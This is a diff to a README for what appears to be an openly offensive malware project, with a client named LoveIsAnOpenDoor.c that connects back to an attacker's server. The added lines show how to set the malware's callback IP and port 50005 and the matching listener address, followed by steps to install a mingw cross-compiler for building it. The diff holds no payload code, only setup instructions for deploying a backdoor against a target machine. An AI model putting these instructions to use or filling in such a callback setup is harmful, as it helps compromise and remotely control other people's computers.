@@ -11,8 +11,17 @@ Two machines; an attacker and a target.
 ### Installation
 Note: You will only need .c files, other files will be recompiled for you attacker machine. 
 So instead of downloading those file follow the following steps.
-
 - Replace your attacker machine's IP address in LoveIsAnOpenDoor.c and Server.c 
+For the Malware ;
+```
+ServIP = "ENTER ATTACKER MACHINE IP ADDRES SHERE" ; 
+ServPort = 50005 ; 
+```
+For the Server;
+```
+server_address.sin_addr.s_addr = inet_addr("ENTER ATTACKER MACHINE IP ADDRES SHERE");
+server_address.sin_port = htons(50005);
+```
 - Install ming into you attacker device 
 	```
 	apt-get install mingw64 
